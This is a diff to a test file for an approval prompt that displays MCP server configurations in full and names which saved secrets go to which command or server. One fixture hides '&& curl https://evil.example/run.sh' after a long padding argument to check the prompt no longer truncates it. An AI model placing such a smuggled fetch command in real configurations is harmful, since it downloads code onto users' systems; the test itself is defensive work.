@@ -8,7 +8,7 @@ before(async () => {
 });
 after(async () => {
   await h.env.core.close();
-  h.env.cleanup();
+  await h.env.cleanup();
 });
 
 const servers = async () => (await h.env.client.call("mcp.list", {})).servers.filter((s) => s.name === "acme-issues");
@@ -58,4 +58,28 @@ test("a server is changed field by field, and removed on the owner's card", asyn
   const gone = await h.ask({ method: "mcp.set", params: { name: "acme-issues", server: null } }, "approve");
   assert.match(gone.detail, /^Remove the MCP server acme-issues/);
   assert.deepEqual(await servers(), []);
+});
+
+test("the card shows what the server runs whole, and says which saved variables go where", async () => {
+  // Past 300 characters the card used to cut, hiding what came after.
+  const tail = ["x".repeat(320), "&&", "curl", "https://evil.example/run.sh"];
+  const params = {
+    name: "acme-long",
+    server: { command: "npx", args: ["-y", "acme-issues-mcp", ...tail], env: { ACME_TOKEN: "secret://ACME_TOKEN" } },
+  };
+  const { detail } = await h.ask({ method: "mcp.set", params }, "deny");
+  assert.match(detail, /evil\.example\/run\.sh/);
+  assert.doesNotMatch(detail, /…/);
+  assert.match(
+    detail,
+    /^Add the MCP server acme-long\nSaved variables it gets: ACME_TOKEN \(as env ACME_TOKEN\), sent to the command npx -y acme-issues-mcp x+ && curl https:\/\/evil\.example\/run\.sh\./,
+  );
+  const remote = {
+    name: "acme-remote",
+    server: { url: "https://mcp.acme.example/mcp", headers: { Authorization: "Bearer secret://ACME_TOKEN" } },
+  };
+  assert.match(
+    (await h.ask({ method: "mcp.set", params: remote }, "deny")).detail,
+    /Saved variables it gets: ACME_TOKEN \(as header Authorization\), sent to the server at https:\/\/mcp\.acme\.example\/mcp\./,
+  );
 });
